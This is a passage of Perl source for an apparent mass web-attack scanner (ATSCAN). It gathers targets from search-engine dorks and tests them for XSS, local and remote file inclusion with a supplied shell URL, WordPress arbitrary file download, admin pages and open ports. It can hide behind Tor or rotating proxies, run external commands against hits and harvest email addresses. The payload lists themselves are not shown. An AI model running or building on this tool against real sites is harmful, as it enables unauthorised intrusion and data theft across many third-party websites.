    }else{ $comnd=~s/\-\-TARGET/$URL1/ig; }
  }else{
    if ($comnd=~/\-HOSTIP/) {
      my $ips=checkExtraInfo($URL1);
      if ($ips) { my $ad=inet_ntoa($ips); $comnd=~s/\-\-HOSTIP/$ad/ig; }
      else{ print "$c[2] $TT[11]\n"; }
    }elsif ($comnd=~/\-HOST/) {
      $URL1=removeProtocol($URL1);   
      $URL1=~s/\/.*//s;
      $URL1=checkUrlSchema($URL1);
      $comnd=~s/\-\-HOST/$URL1/ig;
    }elsif ($comnd=~/\-TARGET/) { $comnd=~s/\-\-TARGET/$URL1/ig; }
  }
  stakScan(); print $c[8]; system($comnd); print "\n";
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## PORTS SCAN PROCESS
sub scanPorts { 
  my ($PORTS, $types)=@_;
  @aTscans=();
  scanTitleBgn(); print $c[11]."$SCAN_TITLE[20]"; scanTitleEnd(); title($SCAN_TITLE[20]);
  my $count=0;
  my $closed1=0;
  my $lc=scalar(grep { defined $_} @aTsearch);
  my @PORTS=@{ $PORTS };
  my @TYPES=@{ $types };
  for my $URL(@aTsearch) {
    $URL=~s/\s+$//;
    my $o=OO();
    if ($o>=$limit) { last; }
    else{
	  $count++;
      points(); dpoints(); points();
      print $c[1]."    $DS[9]  ".$c[7]."[$count/$lc] $URL\n";
      if ($URL!~/$V_IP/) { titleSCAN(); print $c[2]."[$URL] $TT[18]\n"; last; }
      my $c1=0;
      foreach my $port(@PORTS) {
        my $o=OO();
        if ($o<$limit) {
          $c1++;
          points() if $c1>1;
          my $c2=0;
          foreach my $type(@TYPES) {
            if ($o<$limit) {
              $c2++;
              points() if $c2>1;
              my $socket;
              if (defined $proxy || defined $prandom) { UA();
                if (defined $prandom) { newIdentity(); }       
                my $px=removeProtocol($psx);
                if ($px=~/((.*)\:(\d{1,6}))/) {
                  my $ProxyAddr=$1;
                  my $ProxyPort=$2;
                  $socket=IO::Socket::INET->new(ProxyAddr => $ProxyAddr, ProxyPort => $ProxyPort, PeerAddr=> $URL, PeerPort=> $port,Proto=> $type) or $closed1++;
                }
              }else{
                $socket=IO::Socket::INET->new(PeerAddr=> $URL, PeerPort=> $port, Proto=> $type) or $closed1++;
              }                
              close $socket if defined $socket;     
	          print $c[1]."    $DS[7]    $c[10]$port\n $c[1]   $DS[8]    $c[10]$type\n"; titleSCAN();;
	          if ($closed1==0) {
                print $c[3]."$DS[42]\n";
                my $URL1;
                if (defined $command) {
                  $URL1="$URL:$port";
                }else{
                  $URL1="$URL:$port $type";
                }
                saveme($URL1, "");
              }else{
                print $c[2]."$DS[43]\n";
              }
            }
            my $closed1=0;
          }
        }
      }
    }
  }
  close (TEXT);
  points(); dpoints(); points(); endScan();
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## MD5 ENCODE BASE64 DECODE BASE 64
sub scanCode {
  my ($title, $string, $scan1, $scan2, $scan3)=@_;
  @aTscans=();
  scanDetail(); scanTitleBgn(); print $c[11]."$title"; scanTitleEnd();
  points(); dpoints(); points();
  print $c[1]."    $OTHERS[4]  $c[10]$string\n";
  titleSCAN();
  if ($scan1) { print "$c[3]".Digest::MD5->md5_hex($string)."\n"; }
  if ($scan2) { print "$c[3]".encode_base64($string)."\n"; }
  if ($scan3) { print "$c[3]".decode_base64($string)."\n"; }
  points(); dpoints(); points();
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## GET ALL PARAMS TO SCAN
sub makeSscan { 
  my ($ct, $dt, $et, $ar, $v_ar, $title, $paylNote, $result, $reverse, $reg, $comnd, $isFilter, $data, $no)=@_;
  @aTscans=();
  ptak();
  checkHeaders($ct, $dt, $et);  
  if (!$no) { print $c[11]."$title"; scanTitleEnd(); title($title); }
  print $c[4]."$paylNote" if (defined $paylNote and !defined $payloads);
  my @arr;
  if (defined $payloads) { @arr=@userArraysList; }
  else{ @arr=@{ $ar }; }  
  my @filter=@{ $v_ar };
  my $filter=join("|", @filter); 
  my @aTsearch=checkDuplicate(@aTsearch);
  my $lc=scalar(grep { defined $_} @aTsearch);
  my $count=0;
  for my $URL(@aTsearch) {
    $URL=~s/\s+$//;
    my $o=OO();
    if ($o>=$limit) { last; }
    else{
      $count++;
      points(); dpoints(); points();
      $URL=checkUrlSchema($URL);
      print $c[1]."    $DS[9]  "; print $c[10].$c[7]."[$count/$lc] $URL\n";
      $URL=control($URL);
      if (!@arr) {     
        if (!$result) {
          if (defined $exploit) { getExploitArrScan($URL, "", $filter, $result, $reg, $comnd, $isFilter, "", "", $data, "");
          }else{
            my $URL1=$URL; $URL1=~s/ //g;
            if ($reg) { doScan($URL1, $filter, "", "", $reg, "", "", ""); }
            elsif ($comnd) { doScan($URL1, $filter, "", "", "", $comnd, "", ""); }
            elsif ($data) { doScan($URL1, $filter, "", "", "", "", "", $data); }
            else{ doScan($URL1, $filter, "", "", "", "", $isFilter, "", "", ""); }
          }
        }else{
          if (defined $exploit) { getExploitArrScan($URL, "", $filter, $result, $reg, $comnd, $isFilter, "", "", $data, ""); }
          else{ my $URL1=$URL; $URL1=~s/ //g; doScan($URL1, $filter, $result, "", "", "", $isFilter, $data); }
        }
      }else{
        my $pm=0;
        foreach my $arr(@arr) {
          my $o=OO();
          if ($o<$limit) {
            $pm++;
            points() if $pm>1;
            print $c[1]."    $DS[5]  $c[10] [$pm/".scalar(grep { defined $_} @arr)."] $arr"; print $shell if defined $shell; print "\n";
            if ((defined $exploit) || (defined $p)) {
              getExploitArrScan($URL, $arr, $filter, $result, $reg, $comnd, $isFilter, $pm, scalar(grep { defined $_} @arr), $data, "");
            }else{
              if ($reverse) { $URL=removeProtocol($URL); my $URL1=$arr.$URL; $URL1=~s/ //g;  $URL1=checkUrlSchema($URL1); doScan($URL1, "", "", $reverse, "", "", $isFilter, $data); }
              else{ my $URL1=$URL.$arr; $URL1=~s/ //g; doScan($URL1, $filter, "", "", "", "", $isFilter, $data); }
            }
          }
        }
      }
    }
  }  
  close(TEXT);
  points(); dpoints(); points(); endScan();
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## CHECK SCANS HEADERS
sub checkHeaders {
  my ($ct, $dt, $et)=@_;
  if ($ct) { scanTitleBgn(); }
  if ($dt) { removeDupDom(); }
  if ($et) { removeDupNoProtocol(); }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## MAKE SCAN WITH EXPLOIT IN ARRAY
sub getExploitArrScan{
  my ($URL, $arr, $filter, $result, $reg, $comnd, $isFilter, $pm, $pmarr, $data)=@_;
  if (defined $exploit) {
    my $lc=scalar(grep { defined $_} @exploits);
    my $count3=0;
    for my $exp(@exploits) {
      $exp=~s/\s+$//;
      my $o=OO();
      if ($o<$limit) {
	    $count3++; points() if $count3>1;
        if ($arr) { print $c[1]."    $DS[5]  $c[10] [$pm/$pmarr] $arr\n" if $count3>1; }
        print $c[1]."    $DS[6]$c[10] [$OTHERS[1] $count3/$lc] $exp\n" if !defined $p;
        if (defined $p) {
          if ($arr) { getPArrScan($URL, $arr, $filter, $result, $reg, $comnd, $isFilter, $pm, $pmarr, $exp, $lc, $count3, $data); }
          else{ getPArrScan($URL, "", $filter, $result, $reg, $comnd, $isFilter, "", "", $exp, $lc, $count3, $data); }
        }else{
          if ($arr) { my $URL1=$URL.$exp.$arr; $URL1=~s/ //g; doScan($URL1, $filter, $result, "", $reg, $comnd, $isFilter, $data); }
        else{ my $URL1=$URL.$exp; $URL1=~s/ //g; doScan($URL1, $filter, $result, "", $reg, $comnd, $isFilter, $data); }
        }
      }
    }
  }else{
    if ($arr) { getPArrScan($URL, $arr, $filter, $result, $reg, $comnd, $isFilter, $pm, $pmarr, "", "", "", $data); }
    else{ getPArrScan($URL, "", $filter, $result, $reg, $comnd, $isFilter, "", "", "", "", "", $data); }
  }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## MAKE SCAN WITH DEFINED PARAMETERS
sub getPArrScan{
  my ($URL, $arr, $filter, $result, $reg, $comnd, $isFilter, $pm, $pmarr, $exp, $lc, $count3, $data)=@_;
  if (defined $p) {
    my @P=split(",", $p);
    my $pc=0;
    foreach my $P(@P) {
      my $o=OO();
      if ($o<$limit) {
        $pc++;
        points() if $pc>1;
        if ($exp) { print $c[1]."    $DS[6]$c[10] [$OTHERS[1] $count3/$lc] $exp\n"; }
        if ($arr) { print $c[1]."    $DS[5]  $c[10] [$pm/$pmarr] $arr\n" if $pc>1; }
        print $c[1]."    $OTHERS[16]  $c[10] [$pc/".scalar(grep { defined $_} @P)."] $P\n";
        if (index($URL, $P) != -1) {
          my $URL1=$URL;
          if (index($URL, "?$P=") != -1) { $URL1=~s/\?$P=([^&]*)/\?$P=$1$exp$arr/g; doScan($URL1, $filter, $result, "", $reg, $comnd, $isFilter, $data); }
          elsif (index($URL, "&$P=") != -1) { $URL1=~s/\&$P=([^&]*)/\&$P=$1$exp$arr/g; doScan($URL1, $filter, $result, "", $reg, $comnd, $isFilter, $data); }
          else{ print $c[1]."    $DS[4]:   $c[2]$OTHERS[17] [$P]\n"; }
        }
      }
    }
  }
}          
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## MOVE URL TO SCAN
sub doScan {
  my ($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $data)=@_;
  my ($i, $sl, $rangQ);
  $URL1.=$shell if defined $shell;
  my $n=0;
  if ($URL1=~/rang\((\d+)\-(\d+)\)/) {
    my @rangQ=($1 .. $2);
    $URL1=~s/rang\((\d+)\-(\d+)\)/ RPEATR /g;
    for $rangQ(@rangQ) {
      my $o=OO();
      if ($o<$limit) {
        $n++; points() if $n>1;
        doBuild($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $rangQ, scalar(grep { defined $_} @rangQ), $n, $data);
      }
    }
  }elsif ($URL1=~/repeat\((.*)\-(\d+)\)/) {
    $URL1=~s/repeat\((.*)\-(\d+)\)/ RPEATR /g;
    for($i=1;$i<=$2;$i++) {
      my $o=OO();
      if ($o<$limit) {
        $n++; points() if $n>1;
        $sl="$1" x $i; doBuild($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $sl, $2, $n, $data);
      }
    }
  }else{ buildPrint($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $data); }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## DO SCAN
sub doBuild {
  my ($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $rangQ, $nn, $n, $data)=@_;
  my $o=OO();
  if ($o<$limit) {
    $URL1=~s/ RPEATR /$rangQ/ig;
    my $PURL1=$URL1;
    print $c[1]."    URL    $c[10] [$n/$nn] $PURL1\n";
    buildPrint($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $data);
  }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## BUILD SCAN RESULTS LISTS
sub buildPrint {
  my ($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $data)=@_;
  my $form;
  my $o=OO();
  if ($o<$limit) {
    if ($data) {
      my $lc2=scalar(grep { defined $_} @data);
      my $nt;
      for my $form(@data) {
        $form=~s/\s+$//g;       
        my $o=OO();
        if ($o<$limit) {
          $nt++; points if $nt>1;
          print $c[1]."    $DT[32]    ".$c[10]."[$nt/$lc2] $form\n";
          $form=~s/^\[DATA\]//g;
          if (defined $post) {
            $form=~s/:/'=>'/g; $form=~s/\[DATA\]/', '/g; $form="'".$form."'";
          }elsif(defined $get) { $form=~s/:/=/g; $form=~s/\[DATA]/&/g; }
          my ($response, $status, $html)=browseUrl($URL1, $form);   
          printResults($URL1, $response, $status, $html, $filter, $result, $reverse, $reg, $comnd, $isFilter, $form);
        }
      }
    }else{
      my ($response, $status, $html)=browseUrl($URL1, "");
      printResults($URL1, $response, $status, $html, $filter, $result, $reverse, $reg, $comnd, $isFilter, "");
    }
  }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## BUILD SCAN RESULTS LISTS
sub titleSCAN {
  my $o=OO();
  if ($o<$limit) {
    if ((defined $Hstatus) || (defined $validText)) {
      print $c[1]."    $DS[12]   ";
      if (defined $validText) { print $c[10]."$validText"; }
      if (defined $Hstatus) { print $c[10]."$DS[13] $Hstatus"; }
      print "\n";
    }
    print $c[1]."    $DS[4]    ";
  }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## NO RESULTS FOUND
sub noResult { print $c[2]."$DT[1]\n"; }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## CHECK RESULTS TO SCAN
sub printResults { 
  my ($URL1, $response, $status, $html, $filter, $result, $reverse, $reg, $comnd, $isFilter, $data)=@_;
  my $o=OO();
  if ($o<$limit) {
    if ($result) {
      titleSCAN() if $result && (defined $Hstatus || defined $validText);
      validateResult($URL1, $status, $html, $response, $result);
    }
    elsif ($reg) {
      getRegex($URL1, $html, $reg); }
    elsif ($comnd) {
      my $cV=checkValidation($URL1, $status, $html, $response, "");
      print "$c[1]    $DT[24]   $c[10]$comnd\n";
      titleSCAN();
      if ($cV) { getComnd($URL1, $comnd); }else{ noResult(); }
    }elsif ($data) {
      titleSCAN(); formData($URL1, $html, $status, $response); 
    }else{
      titleSCAN();
      if ($isFilter) {
        if ($html=~/$filter/) {
          validateResult($URL1, $status, $html, $response, "");
        }else{ noResult(); }
      }elsif ($reverse) {  
        if ($status==200) {
          validateResult($URL1, $status, $html, $response, "");
        }else{ noResult(); }
      }else{
        if ($response->is_success and !$response->previous) {
          validateResult($URL1, $status, $html, $response, "");
        }else{ noResult(); }
      }
    }
  }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## VALIDATE RESULTS
sub validateResult {
  my ($URL1, $status, $html, $response, $result)=@_;
  my $cV=checkValidation($URL1, $status, $html, $response, "");        
  if ($cV) { doPrint($URL1, $result, $html); }else{ noResult(); }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## PRINT POST DATA RESULTS
sub formData {
  my ($URL1, $html, $status, $response)=@_;
  my $o=OO();
  if ($o<$limit) {
    if (defined $Hstatus or defined $validText) {
      validateResult($URL1, $status, $html, $response, "");
    }else{
      if (length($html)>5) { stakScan(); print $c[8]."$html\n"; }
      else{ print "$c[2]$TT[18]\n"; }
    }
  }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## CHECK VALIDATION SEARCH RESULTS / TARGETS LIST
sub checkValidation {
  my ($URL1, $status, $html, $response, $result)=@_;
  my $cV;
  if (defined $Hstatus) { if ($status==$Hstatus) { $cV=$URL1; }else{ $cV=""; } }
  elsif (defined $validText) { if ($html=~/$validText/) { $cV=$URL1; }else{ $cV=""; } }
  else{ $cV=$URL1; } 
  return $cV;
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## PRINT RESULTS
sub doPrint {
  my ($URL1, $result, $html)=@_;
  my $o=OO();
  if ($o<$limit) {
    print $c[3]."$URL1\n" unless (($result) && (!defined $Hstatus and !defined $validText));
    if (defined $beep) { print chr(7); } saveme($URL1, "");
    if (defined $content) { dpoints(); print $c[10]."$html\n"; }
  }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## CHECK IF THERE MORE SCANS TO DO
sub getK { 
  my ($x, $y)=@_; my $k=0; splice @z, $x, $y;
  for (@z) { if (defined $_) { $k++; } } return $k;  
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## END SCAN
sub endScan {
  my $o=OO();
  if ($o>0) {
    countResultLists();
    if (defined $output) { print $c[4]."[!] $DT[13] $outdir/$output!\n"; }
  }else{ negative(); logoff(); }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## COPY SCAN TO TARGETS LIST
sub doUnlink {
  my $o=OO();
  if ($o>0) { @aTsearch=(); push @aTsearch, @aTscans; @aTscans=(); } }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## PRINT INFO ENGINE
sub printMotor {
  my @motors=@_;
  print $c[1]."[::] $DS[29]   ".$c[10];
  if (defined $mrandom) { print "[$TT[12]\]"; }
  for my $motor(@motors) {
    $motor=~s/MYBROWSERLANG/$browserLang/g;
    $motor=~s/MYGOOGLEDOMAINE/$googleDomain/g;
    my $l2;
    if ($motor=~/((bing.|google.|ask.|yandex.|sogou.)(.*)\/)/) { $l2=$1; $l2=~s/\/.*//s; $l2="[$l2]"; }
    if ($motor=~/bing/) { print $l2; }
    if ($motor=~/google/) { print $l2; }
    if ($motor=~/ask/) { print $l2; }
    if ($motor=~/yandex/) { print $l2; }
    if ($motor=~/sogou/) { print $l2; }
  }
  print "\n";
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## PRINT INFO PROXY
sub printProxy {
  print $c[1]."    $DS[11]   ";
  if (defined $prandom) { print $c[10]."[$TT[12]\] "; }
  if (defined $proxy || defined $prandom) { print $c[10]."[$psx]"; }
  else{ print $c[10]."$DS[46]"; }
  print "\n";
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## PRINT INFO DORK
sub printDork {
  my @dor=@_;
  print $c[1]."[::] $DS[1]     $c[10]";     
  for my $dor(@dor) {
    $dor=~s/\s+$//;
    $dor=~s/ip%3A//g;
    print "[$dor]";
  }
  print "\n";
  print $c[1]."[::] LEVEL   $c[10] [$mlevel]\n";
  if (defined $ifinurl || defined $unique || defined $searchRegex) {
    print $c[1]."[::] FILTERS  $c[10]";
    if (defined $ifinurl) { print "[$TT[19]\]\n"; }
    if (defined $unique) { print "[$DS[30]\]\n"; }
    if (defined $searchRegex) { print "[$searchRegex]\n"; }
  }
  ptak();
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## ENGINE PROCEDURE
sub msearch {
  desclaimer();
  testConnection();
  scanDetail();
  scanTitleBgn();
  print $c[11]."$SCAN_TITLE[0]"; scanTitleEnd();
  printMotor(@motors);
  printDork(@dorks);
  print $c[4]."[!] $DT[31]\n";
  for my $motor(@motors) {
    for my $dork(@dorks) {
      if (defined $Target) { $dork="ip%3A".$dork; }
      $dork=~s/\s+$//;
      $dork=~s/ /+/g;
      $dork=~s/:/%3A/g;
      $dork=~s/^(\+|\s+)//g;
      $motor=~s/MYDORK/$dork/g;
      my $mlevel=$mlevel;
      $mlevel=$mlevel+=-10 if $mlevel > 9;
      for(my $npages=0;$npages<=$mlevel;$npages+=10) {
        $motor=~s/MYNPAGES/$npages/g;
        my $search=$ua->get("$motor");
        $search->as_string;
        my $Res=$search->content;
        doSearch($Res, $motor); 
      }
      $motor=~s/$dork/MYDORK/g;
    }
  }
  printSearch();
} 
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## BUILD ENGINE URL
sub printEngineInfo {
  my ($dork, $motor, $npages)=@_;
  $motor=~s/MYDORK/$dork/g;
  $motor=~s/MYID/$Id/g;
  $motor=~s/MYMSID/$MsId/g;
  $motor=~s/MYNPAGES/$npages/g;
  return $motor;
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## GET ENGINE RESULTS
sub goToEngine {
  my $motor=$_[0];
  my $search=$ua->get("$motor");
  $search->as_string;
  my $Res=$search->content;
  doSearch($Res, $motor);
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## PRINT ENGINE RESULTS
sub printSearch {
  my $motor=$_[0];
  if (defined $searchRegex) { doRegex($searchRegex); }
  if (scalar(grep { defined $_} @aTsearch)>0) {
    my @aTsearch=checkDuplicate(@aTsearch);
    print $c[3]."[!] ".scalar(grep { defined $_} @aTsearch)." $DT[4]\n";
    my $k=getK(0, 0);
    if (!$k) {
      makeSscan("", "", "", \@TODO, \@V_TODO, "", "", "1", "", "", "", "", "", "1");
    }
  }else{ negative(); logoff(); }
  Menu();
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## COUNT RESULTS
sub OO { my $o=scalar(grep { defined $_} @aTscans); return $o; }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## GET WORDPRESS SITES
sub WpSites { makeSscan("3", "", "", \@TODO, \@V_WP, $SCAN_TITLE[3], "", "", "", "", "", "1", "", ""); }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## GET WORDPRESS SITES
sub JoomSites { makeSscan("3", "", "", \@TODO, \@V_JOOM, $SCAN_TITLE[4], "", "", "", "", "", "1", "", ""); }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## XSS
sub xss { makeSscan("3", "", "", \@XSS, \@V_XSS, $SCAN_TITLE[5], $paylNote, "", "", "", "", "1", "", ""); }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## LFI
sub lfi { makeSscan("3", "", "", \@LFI, \@V_LFI, $SCAN_TITLE[6], $paylNote, "", "", "", "", "1", "", ""); }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## RFI JOOMLA
sub JoomRfi { makeSscan("3", "4", "", \@RFI, \@E_SHELL, $SCAN_TITLE[7], $paylNote, "", "", "", "", "1", "", ""); restaureSearch(); }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## WORDPRESS ADF
sub WpAfd { makeSscan("3", "4", "", \@ADFWP, \@V_AFD, $SCAN_TITLE[8], $paylNote, "", "", "", "", "1", "", ""); restaureSearch(); }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## GET ADMIN PAGE
sub adminPage { makeSscan("3", "4", "", \@ADMIN, \@V_TODO, $SCAN_TITLE[9], $paylNote, "", "", "", "", "", "", ""); restaureSearch(); }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## GET SUBDOMAINS
sub subdomain { makeSscan("3", "4", "5", \@SUBDOMAIN, \@V_TODO, $SCAN_TITLE[10], $paylNote, "", "1", "", "", "", "", ""); restaureSearch(); }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## GET UPLOAD FILES
sub uploadSites { makeSscan("3", "4", "", \@UPLOAD, \@V_TODO, $SCAN_TITLE[11], $paylNote, "", "", "", "", "", "", ""); restaureSearch(); }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## GET ZIP FILES
sub zipSites { makeSscan("3", "4", "", \@ZIP, \@V_TODO, $SCAN_TITLE[12], $paylNote, "", "", "", "", "", "", ""); restaureSearch(); }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## GET IPS
sub Ips { makeSscan("3", "", "", \@TODO, \@V_TODO, $SCAN_TITLE[21], "", "", "", $V_IP, "", "", "", ""); }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## GET E-MAILS
sub eMails { makeSscan("3", "", "", \@TODO, \@V_TODO, $SCAN_TITLE[13], "", "", "", $V_EMAIL, "", "", "", ""); }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## GET REGEX
sub Regex { makeSscan("3", "", "", \@TODO, \@V_TODO, $SCAN_TITLE[22], "", "", "", $V_REGEX, "", "", "", ""); }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## GET OPEN PORTS
sub ports {  
  my (@PORTS, @TYPES, @aTscans)=();
  if ($port=~/(\d+)\-(\d+)/) { @PORTS=($1..$2); }
  else{ @PORTS=split(/ /, $port); } 
  if (defined $udp) { push(@TYPES, "udp"); }
  if (defined $tcp) { push(@TYPES, "tcp"); }
  scanPorts(\@PORTS, \@TYPES);
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## FORM BY POST
sub mdata { makeSscan("3", "", "", \@TODO, \@V_TODO, "DATA", "", "", "", "", "", "", "10", ""); }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## EXTERN COMMAND
sub mcommand { doUnlink(); makeSscan("3", "", "", \@TODO, \@V_TODO, $SCAN_TITLE[16], "", "", "", "", $command, "", "", ""); }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## MD5 ENCODE
sub mmd5 { scanCode($SCAN_TITLE[17], $mmd5, "1", "", ""); } 
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## ENCODE BASE 64
sub mencode64 { scanCode($SCAN_TITLE[18], $mencode64, "", "1", ""); }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## DECODE BASE 64
sub mdecode64 { scanCode($SCAN_TITLE[19], $mdecode64, "", "", "1"); }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## END ALL SCANS #####################################################################################################################################################################################
## MENU          #####################################################################################################################################################################################
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## PRINT INFO MENU
osinfo();
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## VERIFY TARGETS AND PRESCAN
if (defined $mlevel) {
  if ($mlevel < 10) { print $c[4]."[!] $DT[26]\n"; logoff(); }
  if ((defined $dork) || (defined $Target)) { msearch(); logoff(); }
}else{
  if (defined $Target) {
    scanDetail(); my $k=getK(0, 0);    
    if (!$k) { makeSscan("3", "", "", \@TODO, \@V_TODO, $SCAN_TITLE[1], "", "", "", "", "", "", "", ""); subfin(); }else{ Menu(); }
  }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## SCANS MENU
sub Menu {
  if (defined $WpSites) { WpSites(); }
  if (defined $JoomSites) { JoomSites(); }
  if (defined $xss) { xss(); }
  if (defined $lfi) { lfi(); }
  if (defined $JoomRfi) { JoomRfi(); }
  if (defined $WpAfd) { WpAfd(); }
  if (defined $adminPage) { adminPage(); }
  if (defined $subdomain) { subdomain(); }
  if (defined $mupload) { uploadSites(); }
  if (defined $mzip) { zipSites(); }
  if (defined $searchIps) { Ips(); }
  if (defined $eMails) { eMails(); }
  if (defined $regex) { Regex(); }
  if (defined $port) { ports(); } 
  if (defined $command) { mcommand(); }
  if (defined $data) { mdata(); }
  subfin(); logoff();
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## ENCODE DECODE MENU 
if ((defined $mmd5) || (defined $mdecode64) || (defined $mencode64)) { 
  if (defined $mmd5) { mmd5();
  }elsif (defined $mencode64) { mencode64();
  }elsif (defined $mdecode64) { mdecode64(); }
  subfin(); logoff();
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## HELP AND UPDATE TOOL MENU
if (defined $checkVersion) { checkVersion(); }
if (defined $help) { help(); }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## DELETE / UNINSTALL TOOL
if (defined $uninstall) {
  desclaimer();
  print $c[2]."$OTHERS[8]";
  my $resp=<STDIN>;
  chomp ($resp);
  if ($resp=~/(Y|y)/) {
    unlink $scriptbash if -e $scriptbash;
    system "rm -rf $Bin";
    print $c[3]."$OTHERS[9]\n";
  }else{
    system("chmod +x $script | perl $script || atscan");
    mtak(); ptak();
    print $c[4]."    [!] $TT[13]\n";
  }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## END MENU ##########################################################################################################################################################################################
## HELP     ##########################################################################################################################################################################################
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## HELP MENU
sub help {
  desclaimer(); print $c[1]."[::] HELP\n";
  ltak();
  print $c[10]
  ."   --proxy       | Set tor proxy for scans [EX: --proxy \"socks://localhost:9050\"]\n"
  ."                 | Set proxy [EX: --proxy \"http://12.45.44.2:8080\"] \n"
  ."                 | Set proxy list [EX: --proxy list.txt] \n"
  ."  -m             | Set engine motors default bing EX: -m [Bing: 1][Google: 2][Ask: 3][Yandex: 4][Sogou: 5][All: all]\n"
  ."  --proxy-random | Random proxy [EX: --proxy-random list.txt] or --proxy-random \"socks://localhost:9050\"]\n"
  ."  --m-random     | Random of all disponibles engines \n"
  ."  --brandom      | Random all disponibles agents \n"
  ."  --time         | set browser time out \n"
  ."  --dork | -d    | Dork to search [Ex: house [OTHER]cars [OTHER]hotel] \n"
  ."  -t             | Target \n"
  ."  --level | -l   | Scan level (+- Number of page results to scan) \n"
  ."  -p             | Set test parameter EX:id,cat,product_ID \n"
  ."  --save | -s    | Output.\n"
  ."  --content      | Print response content.\n"  
  ."  --data         | data. See examples \n"
  ."  --post         | Use post method \n"
  ."  --get          | Use get method \n"
  ."  --host         | Domain name [Ex: site.com] \n"
  ."  --nobanner     | Hide tool banner\n"
  ."  --beep         | Produce beep sound if positive scan found.\n"
  ."  --ifend        | Produce beep sound when scan process is finished.\n"
  ."  --noinfo       | Jump extra results info.\n"
  ."  --limit        | Pause when scan reaches the defined amount of positive results.\n"
  ."  --valid | -v   | Validate by string \n"
  ."  --status       | Validate by http header status \n"
  ."  --ifinurl      | Get targets with exact string matching\n"
  ."  --sregex       | Get targets with exact regex matching\n"
  ."  --unique       | Get targets with exact dork matching\n"
  ."  --replace      | String to replace \n"
  ."  --with         | String to replace with \n"
  ."  --full         | --replace --full Will replace all url parametres from string to the end\n"
  ."  --payload      | Use your own payloads instead of tool ones\n"
  ."  --exp          | Exploit/Payload \n"
  ."  --xss          | Xss scan \n"
  ."  --lfi          | Local file inclusion \n"
  ."  --joomrfi      | Scan for joomla local file inclusion.\n"
  ."  --shell        | Shell link [Ex: http://www.site.com/shell.txt] \n"
  ."  --wpafd        | Scan wordpress sites for arbitery file download\n"
  ."  --admin        | Get site admin page \n"
  ."  --shost        | Get site subdomains \n"
  ."  --tcp          | TCP port \n"
  ."  --udp          | UDP port \n"
  ."  --sites        | Sites in the server \n"
  ."  --wp           | Wordpress sites in the server\n"
  ."  --joom         | Joomla sites in the server\n"
  ."  --upload       | Get sites with upload files in the server  \n"
  ."  --zip          | Get sites with zip files in the server \n"
  ."  --md5          | Convert to md5 \n"
  ."  --encode64     | Encode base64 string \n"
  ."  --decode64     | decode base64 string \n"
  ."  --TARGET       | Will be replaced by target in extern command \n"
  ."  --HOST         | Will be replaced by host in extern command \n"
  ."  --HOSTIP       | Will be replaced by host IP in extern command \n"
  ."  --PORT         | Will be replaced by open port in extern command \n"
  ."  --ip           | Crawl to get Ips\n"
  ."  --regex        | Crawl to get strings matching regex\n"
  ."  --noquery      | Remove string value from Query url [ex: site.com/index.php?id=string] \n"  
  ."  --command      | Extern Command to execute\n"
  ."  --email        | Get emails \n"
  ."  rang(x-y)      | EX: --exp \"/index.php?id=rang(1-9)\" --xss OR -t \"site.com/index.php?id=rang(1-9)\" --xss\n"
